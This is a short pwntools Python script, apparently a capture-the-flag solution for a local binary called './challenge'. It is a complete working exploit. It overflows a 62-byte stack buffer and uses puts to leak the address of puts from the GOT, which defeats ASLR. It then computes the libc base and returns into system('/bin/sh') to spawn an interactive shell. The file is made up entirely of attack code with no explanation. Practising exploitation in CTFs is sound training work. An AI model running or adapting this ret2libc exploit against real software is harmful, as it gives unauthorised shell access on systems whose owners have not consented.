from pwn import *

OFFSET = 62

# context.log_level = "debug"

s = process("./challenge")
raw_input("Attach GDB")

elf = ELF('./challenge')

s.recvuntil("your name?\n")

s.sendline("A"*OFFSET+p32(elf.symbols['puts'])+p32(elf.symbols['vuln'])+p32(elf.got["puts"]))

puts = u32(s.recv(4))

log.success("Leaked puts: "+hex(puts))

libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")
libc_base = puts-libc.symbols['puts']

libc.address = libc_base

s.recvuntil("your name?\n")

s.sendline("A"*OFFSET+p32(libc.symbols['system'])+p32(0)+p32(next(libc.search("/bin/sh"))))

s.interactive()
